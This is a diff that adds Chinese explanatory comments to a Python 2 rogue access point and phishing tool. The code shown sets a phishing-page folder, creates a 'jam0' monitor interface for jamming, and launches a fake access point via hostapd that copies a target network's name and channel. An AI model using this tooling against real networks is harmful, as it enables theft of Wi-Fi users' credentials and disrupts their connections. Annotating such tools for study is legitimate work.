@@ -25,6 +25,7 @@ conf.verb = 0
 PORT = 8080
 SSL_PORT = 443
 PEM = 'cert/server.pem'
+# 钓鱼页面的文件夹，会自动在里面找index.html
 PHISING_PAGE = "phishing-scenarios/minimal"
 POST_VALUE_PREFIX = "wfphshr"
 NETWORK_IP = "10.0.0.0"
@@ -54,7 +55,7 @@ terminate = False
 # in threading.py
 lock = Lock()
 
-# 读取参数
+# OK
 def parse_args():
     # Create the arguments
     parser = argparse.ArgumentParser()
@@ -318,7 +319,7 @@ def shutdown():
     print '\n[' + R + '!' + W + '] Closing'
     sys.exit(0)
 
-
+# OK
 def get_interfaces():
 
     '''
@@ -354,7 +355,7 @@ def get_interfaces():
                 interfaces["all"].append(iface)
     return interfaces
 
-
+# OK
 def get_iface(mode="all", exceptions=["_wifi"]):
     '''
     从interface的网卡名称中取出某一类型的值
@@ -365,11 +366,12 @@ def get_iface(mode="all", exceptions=["_wifi"]):
             return i
     return False
 
-
+# OK
 def reset_interfaces():
     '''
     重新设置无线网卡的状态
     '''
+    # 删除“jam0”端口
     Popen(['iw', 'dev', 'jam0', 'del'], stdout=DN, stderr=DN)
     monitors = get_interfaces()["monitor"]
     for m in monitors:
@@ -377,14 +379,20 @@ def reset_interfaces():
         if 'mon' in m:
             Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
         else:
-            # 都设置成“managed”状态
+            # 禁用“wlan0”网卡 - ifconfig wlan0 down
             Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
+            # 设置网卡模式为“managed” -
+            # 常见的有Master、Managed、ad-hoc、monitor
+            # 其中Master模式是作为wifi热点的提供者 Managed模式是作为热点的连接者
             Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN)
+            # 开启“m”网卡
             Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)
 
-
+# OK
 def create_virtual_monitor(iface, virtual): 
     try:
+        # 使用iface网卡建立一个monitor类型的虚拟接口virtual
+        # iw dev wlan0 interface add jam0 type monitor flags none
         proc = check_output(['iw', 'dev', iface, 'interface', 'add', virtual, 'type', 'monitor'])
         proc = check_output(['ifconfig', virtual, 'up'])
     except:
@@ -453,8 +461,10 @@ def channel_hop(mon_iface):
 
 
 def sniffing(interface, cb):
-    '''This exists for if/when I get deauth working
-    so that it's easy to call sniff() in a thread'''
+    '''
+    This exists for if/when I get deauth working
+    so that it's easy to call sniff() in a thread
+    '''
     sniff(iface=interface, prn=cb, store=0)
 
 
@@ -475,7 +485,7 @@ def targeting_cb(pkt):
         APs[count] = [ap_channel, essid, mac]
         target_APs()
 
-
+# OK
 def target_APs():
     """
     打印扫描到的AP
@@ -490,7 +500,7 @@ def target_APs():
         print (G + str(ap).ljust(2) + W + ' - ' + APs[ap][0].ljust(2) + ' - ' +
                T + APs[ap][1] + W)
 
-
+# OK
 def copy_AP():
     """
     获得用户指定AP的channel, essid, mac信息
@@ -517,12 +527,14 @@ def copy_AP():
     except KeyError:
         return copy_AP()
 
-
+# OK
 def start_ap(mon_iface, channel, essid, args):
     """
-    通过iface channel essid 信息开启伪AP
+    使用hostapd 通过iface channel essid 信息开启伪AP
     """
     print '[' + T + '*' + W + '] Starting the fake access point...'
+    # 准备hostapd文件中所需的配置信息
+    # 修改了interface，ssid，channel这三个值
     config = (
         'interface=%s\n'
         'driver=nl80211\n'
@@ -532,9 +544,12 @@ def start_ap(mon_iface, channel, essid, args):
         'macaddr_acl=0\n'
         'ignore_broadcast_ssid=0\n'
     )
+
+    # 写入文件
     with open('/tmp/hostapd.conf', 'w') as dhcpconf:
             dhcpconf.write(config % (mon_iface, essid, channel))
 
+    # 运行新的设置
     Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
     try:
         time.sleep(6)  # Copied from Pwnstar which said it was necessary?
@@ -577,28 +592,43 @@ def dhcp(dhcpconf, mon_iface):
     )
     return True
 
-
+# OK
 def get_strongest_iface(exceptions=[]):
+    """
+     1找出所有状态为managed的网卡接口
+     2让每个端口去扫区域中的外部AP
+     3筛选扫到结果最多的端口，把这个strongest的端口返回
+     比如man0 扫到3个AP man1扫到5个AP 认为man1更强并将其返回
+    """
+
+    # 得到所有状态是managed的接口
     interfaces = get_interfaces()["managed"]
-    scanned_aps = []
+    scanned_aps = [] # 存储扫描结果
     for i in interfaces:
         if i in exceptions:
             continue
-        count = 0
+        count = 0 # 记录某一个端口扫到的AP数量
+        # iwlist wlan0 scan
+        # 使用 wlan这个端口扫描并列出区域内的无线AP
         proc = Popen(['iwlist', i, 'scan'], stdout=PIPE, stderr=DN)
         for line in proc.communicate()[0].split('\n'):
             if ' - Address:' in line:  # first line in iwlist scan for a new AP
                 count += 1
+        # 扫描到的结果添加到列表
         scanned_aps.append((count, i))
         print ('[' + G + '+' + W + '] Networks discovered by '
                + G + i + W + ': ' + T + str(count) + W)
     if len(scanned_aps) > 0:
+        # 排序，找出“最强”端口
         interface = max(scanned_aps)[1]
         return interface
     return False
 
-
+# OK
 def start_mode(interface, mode="monitor"):
+    """
+    以mode模式开启interface接口（默认为monitor模式）
+    """
     print ('[' + G + '+' + W + '] Starting ' + mode + ' mode off '
            + G + interface + W)
     try:
@@ -883,8 +913,11 @@ def sniff_dot11(mon_iface):
     """
     sniff(iface=mon_iface, store=0, prn=cb)
 
-
+# OK
 def get_hostapd():
+    """
+    确认本机有hostapd，如果没有自动安装
+    """
     if not os.path.isfile('/usr/sbin/hostapd'):
         install = raw_input(
             ('[' + T + '*' + W + '] hostapd not found ' +
@@ -918,12 +951,12 @@ if __name__ == "__main__":
     print "                      |_|                                "
     print "                                                         "
 
-    # Parse args 从命令行中读取参数
+    # Parse args
     args = parse_args()
     # Are you root?
     if os.geteuid():
         sys.exit('[' + R + '-' + W + '] Please run as root')
-    # Get hostapd if needed 确定系统装了hostapd
+    # Get hostapd if needed
     get_hostapd()
 
     # TODO: We should have more checks here:
@@ -933,7 +966,7 @@ if __name__ == "__main__":
     # Get interfaces
     # 重设无线网卡的状态
     reset_interfaces()
-    # 找一个靠谱的网卡做AP
+    # 找一个靠谱的接口做AP
     strongest_iface = get_strongest_iface()
     if not strongest_iface:
         sys.exit(
@@ -941,6 +974,7 @@ if __name__ == "__main__":
              '] No wireless interfaces found, bring one up and try again'
              )
         )
+    # 启动虚拟接口jam0
     virtual_iface = create_virtual_monitor(strongest_iface, "jam0")
 
 
